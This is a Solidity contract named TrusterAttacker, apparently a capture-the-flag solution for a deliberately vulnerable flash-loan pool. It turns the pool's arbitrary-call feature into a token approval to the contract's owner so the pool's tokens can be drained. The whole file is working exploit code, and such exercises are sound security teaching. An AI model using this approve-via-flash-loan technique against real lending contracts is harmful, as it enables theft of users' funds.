// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./TrusterLenderPool.sol";

contract TrusterAttacker {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack(address aimAddr, address tokenAddr, uint256 amount) external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            owner,
            amount
            );
        TrusterLenderPool pool = TrusterLenderPool(aimAddr);
        pool.flashLoan(0, aimAddr, tokenAddr, data);
    }
}